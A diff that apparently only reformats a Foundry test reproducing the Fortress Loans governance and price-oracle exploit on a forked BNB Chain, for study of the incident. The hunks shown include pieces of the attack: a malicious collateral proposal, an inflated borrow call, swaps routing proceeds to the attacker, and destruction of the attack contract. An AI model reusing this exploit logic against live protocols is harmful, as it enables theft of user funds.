@@ -10,18 +10,21 @@ import "../interface.sol";
     Fortress PriceOracle : https://bscscan.com/address/0x00fcf33bfa9e3ff791b2b819ab2446861a318285#code
     Chain Contract : https://bscscan.com/address/0xc11b687cd6061a6516e23769e4657b6efa25d78e#code
     Fortress Governor Alpha : https://bscscan.com/address/0xe79ecdb7fedd413e697f083982bac29e93d86b2e#code
-    Price Feed : https://bscscan.com/address/0xaa24b64c9b44d874368b09325c6d60165c4b39f2#code*/
+    Price Feed : https://bscscan.com/address/0xaa24b64c9b44d874368b09325c6d60165c4b39f2#code
+*/
 
 /* @News
     Official Announce : https://mobile.twitter.com/Fortressloans/status/1523495202115051520
     PeckShield Alert Thread : https://twitter.com/PeckShieldAlert/status/1523489670323404800
-    Blocksec Alert Thread : https://twitter.com/BlockSecTeam/status/1523530484877209600*/
+    Blocksec Alert Thread : https://twitter.com/BlockSecTeam/status/1523530484877209600
+*/
 
 /* @Reports
     CertiK Incident Analysis : https://www.certik.com/resources/blog/k6eZOpnK5Kdde7RfHBZgw-fortress-loans-exploit
     Anquanke Incident Analysis : https://www.anquanke.com/post/id/273207
     Freebuf Incident Analysis : https://www.freebuf.com/articles/blockchain-articles/332879.html
-    Learnblockchain.cn Analysis :  https://learnblockchain.cn/article/4062*/
+    Learnblockchain.cn Analysis :  https://learnblockchain.cn/article/4062
+*/
 
 CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 address constant attacker = 0xA6AF2872176320015f8ddB2ba013B38Cb35d22Ad;
@@ -55,7 +58,11 @@ contract ProposalCreateFactory is Test {
         _calldata[0] = abi.encode(fFTS, 700_000_000_000_000_000);
 
         IGovernorAlpha(GovernorAlpha).propose(
-            _target, _value, _signature, _calldata, "Add the FTS token as collateral."
+            _target,
+            _value,
+            _signature,
+            _calldata,
+            "Add the FTS token as collateral."
         );
     }
 
@@ -166,7 +173,12 @@ contract Attack is Test {
 
         IERC20(MAHA).approve(BorrowerOperations, type(uint256).max);
         IBorrowerOperations(BorrowerOperations).openTrove(
-            1e18, 1e27, IERC20(MAHA).balanceOf(address(this)), address(0), address(0), address(0)
+            1e18,
+            1e27,
+            IERC20(MAHA).balanceOf(address(this)),
+            address(0),
+            address(0),
+            address(0)
         );
 
         IERC20(ARTH).approve(ARTHUSD, type(uint256).max);
@@ -229,7 +241,11 @@ contract Attack is Test {
             mulitHop[2] = USDT;
             IERC20(underlyAsset).approve(PancakeRouter, type(uint256).max);
             IPancakeRouter(payable(PancakeRouter)).swapExactTokensForTokens(
-                amount, 0, mulitHop, msg.sender, block.timestamp
+                amount,
+                0,
+                mulitHop,
+                msg.sender,
+                block.timestamp
             );
         }
 
@@ -238,7 +254,10 @@ contract Attack is Test {
         singleHop[0] = WBNB;
         singleHop[1] = USDT;
         IPancakeRouter(payable(PancakeRouter)).swapExactETHForTokens{value: address(this).balance}(
-            0, singleHop, msg.sender, block.timestamp
+            0,
+            singleHop,
+            msg.sender,
+            block.timestamp
         );
         emit log_string("\t[Pass] Swap BNB->USDT, amountOut send to attacker");
 
@@ -263,8 +282,14 @@ contract Hacker is Test {
 
     constructor() {
         cheat.createSelectFork("bsc", 17_490_837); // Fork BSC mainnet at block 17490837
-        emit log_string("This reproduce shows how attacker exploit Fortress Loan, cause ~3,000,000 US$ lost");
-        emit log_named_decimal_uint("[Start] Attacker Wallet USDT Balance", IERC20(USDT).balanceOf(address(this)), 18);
+        emit log_string(
+            "This reproduce shows how attacker exploit Fortress Loan, cause ~3,000,000 US$ lost"
+        );
+        emit log_named_decimal_uint(
+            "[Start] Attacker Wallet USDT Balance",
+            IERC20(USDT).balanceOf(address(this)),
+            18
+        );
         cheat.label(attacker, "AttackerWallet");
         cheat.label(address(this), "AttackContract");
         cheat.label(USDT, "USDT");
@@ -292,7 +317,10 @@ contract Hacker is Test {
         ProposalCreateFactory PCreater = new ProposalCreateFactory();
         cheat.stopPrank();
         cheat.label(address(PCreater), "ProposalCreateFactory");
-        emit log_named_address("[Pass] Attacker created [ProposalCreater] contract", address(PCreater));
+        emit log_named_address(
+            "[Pass] Attacker created [ProposalCreater] contract",
+            address(PCreater)
+        );
 
         // txId : 0x12bea43496f35e7d92fb91bf2807b1c95fcc6fedb062d66678c0b5cfe07cc002
         // Do : Create Proposal Id 11
@@ -335,23 +363,30 @@ contract Hacker is Test {
         cheat.stopPrank();
         cheat.label(address(attackContract), "AttackContract");
         assert(address(attackContract) == 0xcD337b920678cF35143322Ab31ab8977C3463a45); // make sure deployAddr is same as mainnet
-        emit log_named_address("[Pass] Attacker created [AttackContract] contract", address(attackContract));
+        emit log_named_address(
+            "[Pass] Attacker created [AttackContract] contract",
+            address(attackContract)
+        );
 
         // txId : 0x6a04f47f839d6db81ba06b17b5abbc8b250b4c62e81f4a64aa6b04c0568dc501
         // Do : Send 3.0203 MahaDAO to Attack Contract
         // Note : This tx is not part of exploit chain, so we just cheat it to skip some pre-swap works ;)
-        stdstore.target(MAHA).sig(IERC20(MAHA).balanceOf.selector).with_key(address(attackContract)).checked_write(
-            3_020_309_536_199_074_866
-        );
+        stdstore
+            .target(MAHA)
+            .sig(IERC20(MAHA).balanceOf.selector)
+            .with_key(address(attackContract))
+            .checked_write(3_020_309_536_199_074_866);
         assert(IERC20(MAHA).balanceOf(address(attackContract)) == 3_020_309_536_199_074_866);
         emit log_string("[Pass] Attacker send 3.0203 MahaDAO to [AttackContract] contract");
 
         // txId : 0xd127c438bdac59e448810b812ffc8910bbefc3ebf280817bd2ed1e57705588a0
         // Do : Send 100 FTS to Attack Contract
         // Note : This tx is not part of exploit chain, so we just cheat it to skip some pre-swap works ;)
-        stdstore.target(FTS).sig(IFTS(FTS).balanceOf.selector).with_key(address(attackContract)).checked_write(
-            100 ether
-        );
+        stdstore
+            .target(FTS)
+            .sig(IFTS(FTS).balanceOf.selector)
+            .with_key(address(attackContract))
+            .checked_write(100 ether);
         assert(IFTS(FTS).balanceOf(address(attackContract)) == 100 ether);
         emit log_string("[Pass] Attacker send 100 FTS to [AttackContract] contract");
 
@@ -382,7 +417,11 @@ contract Hacker is Test {
         cheat.stopPrank();
         emit log_string("[Pass] Attacker destruct the Attack Contract");
 
-        emit log_named_decimal_uint("[End] Attacker Wallet USDT Balance", IERC20(USDT).balanceOf(attacker), 18);
+        emit log_named_decimal_uint(
+            "[End] Attacker Wallet USDT Balance",
+            IERC20(USDT).balanceOf(attacker),
+            18
+        );
 
         // You shold see attacker profit about 300K USDT
         // The USDT were moved after swapping across the cBridge(Celer Network), and swapped them into ETH and DAI.
